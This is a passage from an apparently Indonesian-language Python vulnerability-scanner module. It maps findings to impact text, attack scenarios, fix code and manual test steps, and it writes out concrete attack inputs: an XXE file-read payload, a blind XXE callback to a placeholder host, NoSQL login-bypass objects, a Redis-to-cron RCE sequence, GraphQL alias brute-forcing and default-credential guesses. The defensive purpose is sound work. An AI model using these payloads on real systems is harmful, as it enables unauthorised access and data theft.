                "app.use(hpp());  // hapus parameter duplikat",
            "Nginx":
                "# Tolak parameter duplikat di reverse-proxy\n"
                "if ($args ~* \"([^&=]+)=[^&]*&\\1=\") {\n"
                "    return 400;\n"
                "}",
        },
        "manual_steps": [
            "Test: ?id=1&id=2 — cek mana yang server pakai.",
            "Cocokkan dengan WAF — kalau beda, ada bypass potential.",
        ],
    },
    # --- WebSocket / GraphQL / OpenAPI / NoSQL / XXE ------------------------
    "websocket": {
        "impact": (
            "Cross-site WebSocket Hijacking → attacker bisa kirim/terima pesan WS "
            "atas nama korban (mis. chat impersonation, financial action via WS). "
            "Cleartext ws:// → trafik real-time disadap di Wi-Fi publik."
        ),
        "attack_scenario": (
            "1. Korban login di app yang pakai WS (cookie-based auth).\n"
            "2. Attacker buat halaman: <script>new WebSocket('wss://target.com/ws')</script>\n"
            "3. Server WS terima upgrade dari Origin attacker karena tidak validasi.\n"
            "4. Browser ikut kirim cookie session korban → attacker dapat akses WS otentikasi korban."
        ),
        "fix_examples": {
            "Node ws library":
                "const wss = new WebSocket.Server({\n"
                "  server,\n"
                "  verifyClient: (info) => {\n"
                "    const allowed = ['https://app.example.com'];\n"
                "    return allowed.includes(info.origin);\n"
                "  }\n"
                "});",
            "Token in header (bukan URL)":
                "// Klien:\n"
                "const ws = new WebSocket('wss://target.com/ws', [], {\n"
                "  headers: { Authorization: 'Bearer ' + token }\n"
                "});",
        },
        "manual_steps": [
            "Test handshake dari Origin lain dengan curl/wscat.",
            "Pastikan token tidak di URL (akan tercatat di log).",
            "Test cleartext ws:// — paksa upgrade ke wss://.",
        ],
    },
    "graphql": {
        "impact": (
            "Introspection di-publish → attacker dapat blueprint API (termasuk mutation "
            "admin, internal type). Batching/alias overload → DoS amplifier (1 HTTP "
            "request = 1000 query). Bisa juga authentication bypass via aliases."
        ),
        "attack_scenario": (
            "1. Attacker query introspection → dapat seluruh schema termasuk mutation "
            "deleteUser, adminUpdateOrder, dll.\n"
            "2. Cari mutation admin yang authn-nya lemah → coba panggil tanpa token / "
            "dengan token user biasa.\n"
            "3. Atau brute-force password via alias: { l1: login(u:'a',p:'1') l2: login(u:'a',p:'2') ... } "
            "1000 alias / request, bypass rate-limit per-request."
        ),
        "fix_examples": {
            "Apollo Server":
                "const server = new ApolloServer({\n"
                "  typeDefs, resolvers,\n"
                "  introspection: process.env.NODE_ENV !== 'production',\n"
                "  validationRules: [\n"
                "    depthLimit(7),         // graphql-depth-limit\n"
                "    costAnalysis({ maximumCost: 1000 }),  // graphql-cost-analysis\n"
                "  ],\n"
                "});",
            "Hasura":
                "# settings:\n"
                "HASURA_GRAPHQL_ENABLE_TELEMETRY: false\n"
                "HASURA_GRAPHQL_ENABLE_CONSOLE: false  # production\n"
                "# role anonymous: select-only, batas operations",
        },
        "manual_steps": [
            "POST /graphql query introspection — production harus reject (atau strip __schema).",
            "Test alias amplification: kirim 100 alias dalam 1 query — server cap?",
            "Test mutation admin tanpa token / dengan token user biasa.",
        ],
    },
    "xxe": {
        "impact": (
            "Read-only XXE: baca file lokal (config, /etc/passwd). Blind XXE: "
            "out-of-band exfiltration via DNS/HTTP. SSRF via XXE: scan internal. "
            "Beberapa parser → bisa eskalasi ke RCE."
        ),
        "attack_scenario": (
            "1. POST endpoint XML, body:\n"
            "   <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>\n"
            "2. Parser resolve external entity → response berisi konten /etc/passwd.\n"
            "3. Lanjut: <!ENTITY xxe SYSTEM 'http://internal-api/admin'> → SSRF + read internal."
        ),
        "fix_examples": {
            "Python (defusedxml)":
                "# SALAH: import xml.etree.ElementTree\n"
                "# BENAR:\n"
                "from defusedxml import ElementTree as ET\n"
                "tree = ET.fromstring(user_xml)",
            "Java":
                "DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n"
                "dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n"
                "dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\n"
                "dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);",
            ".NET":
                "var settings = new XmlReaderSettings {\n"
                "  DtdProcessing = DtdProcessing.Prohibit,\n"
                "  XmlResolver = null\n"
                "};",
        },
        "manual_steps": [
            "Cari endpoint yang accept XML (Content-Type: application/xml/text/xml).",
            "Test payload klasik dengan SYSTEM 'file:///etc/passwd'.",
            "Bila tidak ada output, test blind XXE: SYSTEM 'http://yourcollab/x' → cek log collab.",
        ],
    },
    "nosqli": {
        "impact": (
            "Authentication bypass (login dengan password = {$ne: null}), data "
            "exfiltration (return semua dokumen), DoS via $where dengan loop besar."
        ),
        "attack_scenario": (
            "1. Login: POST {username:'admin', password:'guess'}\n"
            "2. Attacker ubah jadi: {username:'admin', password:{$ne:null}}\n"
            "3. Mongoose query: User.findOne({username:'admin', password:{$ne:null}}) → "
            "match user admin (password apapun yang tidak null) → login sebagai admin tanpa password."
        ),
        "fix_examples": {
            "Express + Mongoose":
                "const mongoSanitize = require('express-mongo-sanitize');\n"
                "app.use(mongoSanitize({ replaceWith: '_' }));\n\n"
                "// Plus: validasi tipe input\n"
                "if (typeof req.body.username !== 'string') return res.status(400).end();",
            "Pakai schema validation (Joi/Zod)":
                "const schema = Joi.object({\n"
                "  username: Joi.string().alphanum().required(),\n"
                "  password: Joi.string().required(),\n"
                "});\n"
                "const { error } = schema.validate(req.body);",
        },
        "manual_steps": [
            "Test login: kirim password sebagai object {$ne:null}, {$gt:''}, {$regex:'.*'}.",
            "Test query string: ?username[$ne]=null",
            "Cek apakah server reject body yang field-nya bertipe object (bukan string).",
        ],
    },
    # --- Recon (info-only) --------------------------------------------------
    "ports": {
        "impact": (
            "Setiap port terbuka adalah pintu masuk potensial. Service usang/misconfig "
            "di port itu bisa langsung dieksploitasi (mis. Redis tanpa auth, Elasticsearch "
            "publik, MongoDB tanpa auth)."
        ),
        "attack_scenario": (
            "1. Attacker scan port → temukan 6379/Redis terbuka tanpa auth.\n"
            "2. Connect: telnet target 6379 → ketik INFO → dapat versi & status.\n"
            "3. Pakai CONFIG SET dir /var/spool/cron && CONFIG SET dbfilename root → "
            "Redis menulis file → cron exec → RCE."
        ),
        "fix_examples": {
            "Cloud (AWS Security Group)":
                "# Hanya buka port yang publik perlu (80, 443).\n"
                "# Database/Redis/Elasticsearch HARUS:\n"
                "#   - Tidak diakses 0.0.0.0/0\n"
                "#   - Hanya dari security group app server\n"
                "# SSH/RDP: hanya dari IP admin tertentu (atau pakai SSM/Bastion).",
            "Linux (ufw)":
                "sudo ufw default deny incoming\n"
                "sudo ufw allow 80/tcp\n"
                "sudo ufw allow 443/tcp\n"
                "sudo ufw allow from 10.0.0.0/24 to any port 22  # SSH internal only\n"
                "sudo ufw enable",
        },
        "manual_steps": [
            "Untuk tiap port terbuka: identifikasi service & versi (nmap -sV).",
            "Cek CVE versi tersebut di https://cve.mitre.org/",
            "Pastikan service punya auth (mis. Redis: AUTH password, Elasticsearch: xpack security).",
        ],
    },
    "subdomains": {
        "impact": (
            "Setiap subdomain memperluas attack surface. Subdomain takeover (CNAME ke "
            "service yang sudah dihapus) → attacker host konten di subdomain Anda → phishing "
            "yang sangat kredibel + cookie subdomain.com bisa di-set."
        ),
        "attack_scenario": (
            "1. CNAME staging.target.com → old-app.herokuapp.com (Heroku app sudah dihapus).\n"
            "2. Attacker bikin Heroku app dengan nama old-app.herokuapp.com.\n"
            "3. Attacker host konten apapun di staging.target.com.\n"
            "4. Set cookie *.target.com → mengganggu sesi user di app utama."
        ),
        "fix_examples": {
            "Inventarisasi DNS":
                "# Gunakan tool seperti subjack atau nuclei subdomain takeover template:\n"
                "subjack -w subdomains.txt -t 100 -ssl",
            "Hapus DNS record yang tidak perlu":
                "# Audit setiap CNAME/A record. Bila service-nya sudah tidak dipakai,\n"
                "# hapus record DNS-nya, jangan tinggalkan dangling.",
        },
        "manual_steps": [
            "Untuk tiap subdomain, cek: dig CNAME <sub>.target.com",
            "Bila CNAME ke github.io, herokuapp.com, s3.amazonaws.com, dll. — verifikasi "
            "service-nya masih dimiliki Anda.",
        ],
    },
    "dns": {
        "impact": (
            "SPF/DMARC tidak ada → attacker kirim email spoof atas nama domain Anda → "
            "phishing yang lolos filter mail server tujuan. DMARC=p=none → DMARC hanya "
            "monitor, tidak protect."
        ),
        "attack_scenario": (
            "1. Domain tidak punya DMARC. Attacker setup mail server, kirim email "
            "From: ceo@target.com isi: 'transfer 100 juta ke rek X, urgent'.\n"
            "2. Email diterima inbox karyawan target tanpa warning karena tidak ada DMARC reject."
        ),
        "fix_examples": {
            "DNS records":
                "# SPF record (TXT @ target.com):\n"
                "  v=spf1 include:_spf.google.com -all\n\n"
                "# DKIM (digenerate oleh provider mail Anda)\n\n"
                "# DMARC (TXT _dmarc.target.com):\n"
                "  v=DMARC1; p=quarantine; rua=mailto:dmarc@target.com; pct=100",
        },
        "manual_steps": [
            "Cek di mxtoolbox.com/spf, /dmarc — pastikan p=quarantine atau p=reject.",
            "Mulai dengan p=none + rua untuk monitor 2 minggu.",
            "Setelah aman, escalate ke p=quarantine, lalu p=reject.",
        ],
    },
    "openapi": {
        "impact": (
            "Spec API yang ter-publish memberi attacker peta endpoint lengkap "
            "(termasuk yang tidak terlink dari frontend). Bila spec memuat endpoint "
            "admin / internal yang authn-nya lemah, langsung exploit."
        ),
        "attack_scenario": (
            "1. Attacker akses /swagger.json → dapat 50 endpoint, termasuk /api/admin/users.\n"
            "2. Endpoint /api/admin/users tidak terlink dari frontend tapi tetap publik.\n"
            "3. Attacker akses langsung dengan token user biasa → bila authz lemah, dapat data semua user."
        ),
        "fix_examples": {
            "Hide spec di production":
                "# Express:\n"
                "if (process.env.NODE_ENV !== 'production') {\n"
                "  app.use('/docs', swaggerUi.serve, swaggerUi.setup(specs));\n"
                "}\n"
                "# atau protect dengan basic auth",
            "Pisahkan spec internal & publik":
                "# spec/public.yaml  — endpoint untuk customer, bisa di-publish\n"
                "# spec/internal.yaml — endpoint admin, jangan di-publish",
        },
        "manual_steps": [
            "Audit setiap endpoint di spec — apakah perlu publik?",
            "Test setiap endpoint admin dengan token user biasa — harus 403.",
        ],
    },
    # --- Voucher & auth bypass ---------------------------------------------
    "voucher": {
        "impact": (
            "Risiko spesifik voucher: kerugian finansial langsung (diskon "
            "berlebihan), pelanggaran term promo (1 voucher 1 user), abuse "
            "promo dengan akun bot. Untuk fintech/e-commerce, kerugian bisa "
            "sangat besar bila promo viral atau dieksploitasi reseller."
        ),
        "attack_scenario": (
            "Skenario business-logic flaw voucher (perlu test manual untuk "
            "konfirmasi):\n"
            "1. Discount client-controlled: attacker intercept POST /apply-coupon, "
            "ubah field `discount=5` jadi `discount=99` -> dapat 99% off.\n"
            "2. Voucher single-use, race condition: dua request bayar bersamaan "
            "dalam <50ms, dua-duanya berhasil pakai voucher yang sama -> double benefit.\n"
            "3. Voucher untuk produk lain: voucher 'PROMO_BUKU' di-aplikasi ke "
            "kategori 'ELEKTRONIK' karena server tidak validasi kategori.\n"
            "4. Voucher code bocor di JS bundle: attacker grep /static/app.js, "
            "dapat daftar 50 voucher aktif -> share di forum, semua dipakai."
        ),
        "fix_examples": {
            "Server-side hitung diskon (Express)":
                "// SALAH:\n"
                "app.post('/apply-coupon', async (req, res) => {\n"
                "  const { code, discount } = req.body;  // BAHAYA discount dari client\n"
                "  total -= discount;\n"
                "});\n\n"
                "// BENAR:\n"
                "app.post('/apply-coupon', async (req, res) => {\n"
                "  const { code, orderId } = req.body;\n"
                "  const v = await Voucher.findOne({code, active: true});\n"
                "  if (!v || v.usedBy.includes(req.user.id)) return res.status(400).end();\n"
                "  if (Date.now() > v.expiresAt) return res.status(400).end();\n"
                "  const order = await Order.findById(orderId);\n"
                "  if (order.total < v.minPurchase) return res.status(400).end();\n"
                "  // server hitung discount sendiri\n"
                "  const discount = v.percent ? order.total * v.percent / 100 : v.amount;\n"
                "  if (discount > v.maxDiscount) discount = v.maxDiscount;\n"
                "  // atomic update untuk anti race condition:\n"
                "  await Voucher.updateOne(\n"
                "    {_id: v._id, usedBy: {$ne: req.user.id}},\n"
                "    {$push: {usedBy: req.user.id}, $inc: {usageCount: 1}}\n"
                "  );\n"
                "});",
            "Atomic increment Postgres (anti race)":
                "-- pakai SELECT FOR UPDATE dalam transaction\n"
                "BEGIN;\n"
                "  SELECT * FROM voucher WHERE code = ? AND active = true \n"
                "    AND used_count < max_uses FOR UPDATE;\n"
                "  -- validasi expired, kategori, min_purchase, dll\n"
                "  UPDATE voucher SET used_count = used_count + 1 WHERE id = ?;\n"
                "  INSERT INTO voucher_usage (voucher_id, user_id, order_id) VALUES (?, ?, ?);\n"
                "COMMIT;",
            "Idempotency key untuk anti double-claim":
                "// Klien kirim Idempotency-Key per upaya apply\n"
                "// Server simpan {key, voucher_id, order_id} di redis dengan TTL 1 menit\n"
                "// Request kedua dengan key sama -> return response pertama, tidak proses ulang",
        },
        "manual_steps": [
            "TEST DI SANDBOX, JANGAN PRODUCTION!",
            "Brute-force code: kirim 100 kode random ke /apply-voucher, server harus rate-limit.",
            "Voucher stacking: pakai 2 voucher sekaligus.",
            "Voucher expired: pakai code yang sudah lewat tanggal.",
            "Voucher kategori salah: voucher buku di-apply ke produk elektronik.",
            "Negative discount: discount=-100 atau percent=110.",
            "Single-use race: 2 request bayar bersamaan dengan voucher yang sama.",
            "Min purchase bypass: voucher min Rp 100rb, coba dengan amount Rp 99rb.",
            "Voucher untuk akun lain: ganti userId di body request.",
            "First-time-only voucher dipakai user lama: kirim flag isFirstTime=true.",
        ],
    },
    "auth_bypass": {
        "impact": (
            "Halaman/endpoint sensitif yang seharusnya butuh login bisa diakses "
            "oleh siapapun. Akibat: kebocoran data user/admin, akses fungsi "
            "administratif, dump database lewat phpmyadmin yang lupa di-protect, "
            "dst. Salah satu kategori OWASP A01:2021 Broken Access Control."
        ),
        "attack_scenario": (
            "1. Attacker scan path admin populer: /admin, /phpmyadmin, /actuator.\n"
            "2. Path /admin/users return 200 dengan body berisi daftar user lengkap "
            "dengan email + role. Tidak butuh login.\n"
            "3. Attacker dump seluruh user. Pakai email untuk phishing target. "
            "Pakai role admin yang ditemukan untuk social engineering.\n"
            "4. Bonus: /actuator/env (Spring Boot) return env variables → dapat "
            "DB password, AWS key."
        ),
        "fix_examples": {
            "Express middleware":
                "// Pasang middleware auth di SEMUA route admin\n"
                "function requireAuth(req, res, next) {\n"
                "  if (!req.session?.userId) return res.status(401).json({error: 'unauthorized'});\n"
                "  next();\n"
                "}\n"
                "function requireAdmin(req, res, next) {\n"
                "  if (req.user?.role !== 'admin') return res.status(403).json({error: 'forbidden'});\n"
                "  next();\n"
                "}\n"
                "app.use('/admin/*', requireAuth, requireAdmin);\n"
                "app.use('/api/admin/*', requireAuth, requireAdmin);",
            "Django":
                "from django.contrib.auth.decorators import login_required, user_passes_test\n\n"
                "@login_required\n"
                "@user_passes_test(lambda u: u.is_staff)\n"
                "def admin_dashboard(request):\n"
                "    ...",
            "Spring Boot":
                "@PreAuthorize(\"hasRole('ADMIN')\")\n"
                "@GetMapping(\"/admin/users\")\n"
                "public List<User> list() { ... }\n\n"
                "// disable actuator endpoints di production:\n"
                "// management.endpoints.web.exposure.include=health\n"
                "// management.endpoint.env.enabled=false",
            "Nginx (block path internal yang tidak boleh publik)":
                "location ^~ /admin/ {\n"
                "    allow 10.0.0.0/8;   # internal saja\n"
                "    deny all;\n"
                "}\n"
                "location = /server-status { deny all; }\n"
                "location = /server-info  { deny all; }",
        },
        "manual_steps": [
            "Login dengan creds default umum (test 'placeholder'): admin/admin, "
            "admin/password, root/root - JANGAN brute-force.",
            "Force browse: catat URL setelah login admin, akses dari incognito.",
            "Privilege escalation: akun user biasa coba akses /admin/*.",
            "Session fixation: session ID berubah setelah login?",
            "Logout test: token/cookie post-logout harus reject.",
            "Cek ?debug=1 / ?admin=true / ?bypass=1 di URL.",
        ],
    },
}


def enrich_findings(findings: list[Finding]) -> list[Finding]:
    """Tambahkan impact/attack_scenario/fix_examples/manual_steps berdasarkan modul.

    Tidak overwrite field yang sudah diisi (mis. modul payment yang sudah punya
    manual_steps custom)."""
    for f in findings:
        meta = _BASE.get(f.module)
        if not meta:
            continue
        if not f.impact:
            f.impact = meta.get("impact", "")
        if not f.attack_scenario:
            f.attack_scenario = meta.get("attack_scenario", "")
        if not f.fix_examples:
            f.fix_examples = dict(meta.get("fix_examples", {}))
        if not f.manual_steps:
            f.manual_steps = list(meta.get("manual_steps", []))
    return findings
